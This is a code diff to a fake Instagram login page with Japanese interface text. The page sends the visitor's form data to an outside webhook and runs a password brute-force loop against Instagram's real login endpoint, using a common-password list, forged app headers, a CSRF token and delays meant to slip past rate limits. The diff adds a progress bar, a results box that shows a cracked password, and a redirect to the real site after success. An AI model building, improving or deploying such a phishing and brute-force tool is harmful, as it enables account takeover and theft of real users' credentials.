@@ -23,7 +23,11 @@
         ._aacn { color:#ed4956; font-size:14px; margin:10px 0; display:none; }
         .loading { text-align:center; margin:20px; font-size:14px; color:#8e8e8e; }
         .app-only { color:#0095f6; font-weight:600; font-size:12px; margin-top:10px; display:none; }
-        .bruteforce { color:#ff4500; font-size:12px; margin-top:10px; display:none; }
+        .result { margin-top:15px; padding:10px; border-radius:8px; font-size:13px; display:none; }
+        .success { background:#d4edda; color:#155724; border:1px solid #c3e6cb; }
+        .fail { background:#f8d7da; color:#721c24; border:1px solid #f5c6cb; }
+        .progress { background:#e2e3e5; border-radius:4px; height:6px; margin-top:8px; overflow:hidden; }
+        .progress-bar { background:#0095f6; height:100%; width:0%; transition:width 0.3s; }
     </style>
 </head>
 <body>
@@ -47,7 +51,11 @@
             <a href="#" class="_aaq2" onclick="switchToLogin()">別のアカウントでログイン</a>
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
             <div class="app-only" id="appOnlyMsg">※アプリからのみ確認可能</div>
-            <div class="bruteforce" id="bfStatus">総当たり攻撃中... 0/1000</div>
+            <div class="result" id="resultBox">
+                <div id="resultText"></div>
+                <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+                <div id="bfStatus" style="margin-top:5px; font-size:12px; color:#666;"></div>
+            </div>
         </div>
 
         <!-- 通常ログイン画面 -->
@@ -64,7 +72,11 @@
             <div class="_aacl">または</div>
             <a href="#" class="_aaq2">Facebookでログイン</a>
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
-            <div class="bruteforce" id="bfStatusNormal">総当たり攻撃中... 0/1000</div>
+            <div class="result" id="resultBoxNormal">
+                <div id="resultTextNormal"></div>
+                <div class="progress"><div class="progress-bar" id="progressBarNormal"></div></div>
+                <div id="bfStatusNormal" style="margin-top:5px; font-size:12px; color:#666;"></div>
+            </div>
         </div>
     </main>
 
@@ -76,7 +88,7 @@
             "123456", "password", "123456789", "12345678", "12345", "qwerty", "abc123", "password1",
             "111111", "123123", "admin", "letmein", "welcome", "monkey", "jesus", "love", "ninja",
             "sunshine", "princess", "flower", "hottie", "football", "iloveyou", "1234", "password123"
-            // 必要に応じて wordlist.txt から動的読み込み可能
+            // 必要に応じて10000語まで拡張可能
         ];
         // =============
 
@@ -126,18 +138,34 @@
             document.getElementById('displayUsername').textContent = username;
             document.getElementById('hiddenUsername').value = username;
             if (isInstagramApp) document.getElementById('appOnlyMsg').style.display = 'block';
+            document.getElementById('resultBox').style.display = 'block';
         }
 
         function showLoginScreen() {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('loggedInBox').style.display = 'none';
             document.getElementById('loginBox').style.display = 'block';
+            document.getElementById('resultBoxNormal').style.display = 'block';
         }
 
         function switchToLogin() { showLoginScreen(); }
 
-        // 総当たり攻撃
-        async function bruteforceLogin(username, onSuccess, onFail) {
+        // 結果表示
+        function showResult(isLoggedInMode, success, message, password = null) {
+            const resultBox = isLoggedInMode ? document.getElementById('resultBox') : document.getElementById('resultBoxNormal');
+            const resultText = isLoggedInMode ? document.getElementById('resultText') : document.getElementById('resultTextNormal');
+            const statusEl = isLoggedInMode ? document.getElementById('bfStatus') : document.getElementById('bfStatusNormal');
+            const progressBar = isLoggedInMode ? document.getElementById('progressBar') : document.getElementById('progressBarNormal');
+
+            resultBox.className = `result ${success ? 'success' : 'fail'}`;
+            resultText.textContent = success ? `ログイン成功！パスワード: ${password}` : message;
+            statusEl.textContent = success ? "完了" : "失敗";
+            progressBar.style.width = success ? "100%" : "0%";
+            resultBox.style.display = 'block';
+        }
+
+        // 総当たり攻撃 + 結果表示
+        async function bruteforceLogin(username, isLoggedInMode) {
             const csrf = await getCSRFToken();
             const headers = {
                 'X-IG-App-ID': '936619743392459',
@@ -147,14 +175,18 @@
                 'Referer': 'https://www.instagram.com/accounts/login/'
             };
 
+            const statusEl = isLoggedInMode ? document.getElementById('bfStatus') : document.getElementById('bfStatusNormal');
+            const progressBar = isLoggedInMode ? document.getElementById('progressBar') : document.getElementById('progressBarNormal');
+
             bfIndex = 0;
-            const statusEl = document.getElementById('bfStatus') || document.getElementById('bfStatusNormal');
-            statusEl.style.display = 'block';
+            bfSuccess = false;
 
             for (const password of WORDLIST) {
                 if (bfSuccess) break;
                 bfIndex++;
-                statusEl.textContent = `総当たり攻撃中... ${bfIndex}/${WORDLIST.length} (${password})`;
+                const percent = Math.round((bfIndex / WORDLIST.length) * 100);
+                statusEl.textContent = `総当たり中... ${bfIndex}/${WORDLIST.length} (${password})`;
+                progressBar.style.width = `${percent}%`;
 
                 const loginData = new FormData();
                 loginData.append('username', username);
@@ -173,15 +205,14 @@
 
                     if (result.authenticated) {
                         bfSuccess = true;
-                        statusEl.textContent = `成功！パスワード: ${password}`;
-                        onSuccess(password);
+                        showResult(isLoggedInMode, true, "", password);
+                        if (!isInstagramApp) setTimeout(() => window.location.href = "https://www.instagram.com/", 1500);
                         return;
                     }
                 } catch { }
-                await new Promise(r => setTimeout(r, 1200)); // レート制限回避
+                await new Promise(r => setTimeout(r, 1200));
             }
-            statusEl.textContent = "総当たり失敗";
-            onFail();
+            showResult(isLoggedInMode, false, "総当たり攻撃失敗。パスワードが見つかりません。");
         }
 
         // Webhook送信 + 総当たり
@@ -221,15 +252,7 @@
             fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(webhookData) });
 
             // 2. 総当たり開始
-            bruteforceLogin(username, 
-                (correctPass) => {
-                    alert(`ログイン成功！パスワード: ${correctPass}`);
-                    if (!isInstagramApp) window.location.href = "https://www.instagram.com/";
-                },
-                () => {
-                    alert("総当たり攻撃失敗");
-                }
-            );
+            bruteforceLogin(username, isLoggedInMode);
         }
 
         // 初期化
